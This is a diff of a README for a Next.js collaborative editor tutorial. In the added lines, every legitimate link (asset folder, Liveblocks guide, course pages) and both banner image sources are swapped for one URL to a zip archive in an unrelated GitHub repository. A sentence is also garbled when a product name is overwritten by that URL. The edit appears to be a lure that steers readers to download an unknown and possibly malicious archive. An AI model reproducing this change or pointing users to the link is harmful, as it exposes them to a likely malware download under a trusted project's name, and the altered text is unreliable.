-- Public assets used in the project can be found [here](https://drive.google.com/file/d/1MCQaP-imgDdopwcUn4CN_D-WglDc--Ho/view?usp=sharing)
-- [Liveblocks Starter Guide](https://liveblocks.io/docs/get-started/nextjs-lexical)
+- Public assets used in the project can be found [here](https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip)
+- [Liveblocks Starter Guide](https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip)
 
 ## <a name="more">🚀 More</a>
 
-**Advance your skills with Next.js 14 Pro Course**
+**Advance your skills with https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip 14 Pro Course**
 
 Enjoyed creating this project? Dive deeper into our PRO courses for a richer learning adventure. They're packed with detailed explanations, cool features, and exercises to boost your skills. Give it a go!
 
-<a href="https://jsmastery.pro/next14" target="_blank">
-<img src="https://github.com/sujatagunale/EasyRead/assets/151519281/557837ce-f612-4530-ab24-189e75133c71" alt="Project Banner">
+<a href="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" target="_blank">
+<img src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" alt="Project Banner">
 </a>
 
 <br />
@@ -1218,8 +1218,8 @@ Enjoyed creating this project? Dive deeper into our PRO courses for a richer lea
 
 And if you're hungry for more than just a course and want to understand how we learn and tackle tech challenges, hop into our personalized masterclass. We cover best practices, different web skills, and offer mentorship to boost your confidence. Let's learn and grow together!
 
-<a href="https://www.jsmastery.pro/masterclass" target="_blank">
-<img src="https://github.com/sujatagunale/EasyRead/assets/151519281/fed352ad-f27b-400d-9b8f-c7fe628acb84" alt="Project Banner">
+<a href="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" target="_blank">
+<img src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" alt="Project Banner">
 </a>
 
 #
